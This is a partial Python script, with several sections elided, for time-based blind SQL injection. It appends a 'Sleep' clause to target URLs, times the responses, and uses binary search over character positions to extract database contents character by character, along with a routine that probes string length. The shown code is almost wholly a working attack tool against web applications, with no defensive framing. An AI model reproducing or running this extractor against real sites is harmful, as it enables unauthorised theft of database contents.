...
def getStatue(url,note):
    starttime = time.time()
    r = requests.get(url + "and Sleep(0.1) " + note)
    endtime = time.time()
...
def GetName(injecturl,payload,SelectContent,length,note):
    ...
    for pos in range(1,length+1):
        ...
        Mid = ( Max + Min ) // 2
        while Min < Max-1 :
            finalurl = injecturl + payload%(SelectContent,pos,Mid)
            print(finalurl)

            if(getStatue(finalurl,note)>0):
                Min = Mid
            else:
                Max = Mid
...
def GetLength(injecturl,SelectSentence):
   for x in range(20):
        finalurl = injecturl+lenstr%(SelectSentence,x)
        print(finalurl)
        if(getStatue(finalurl,note)==False):
            break
   return x
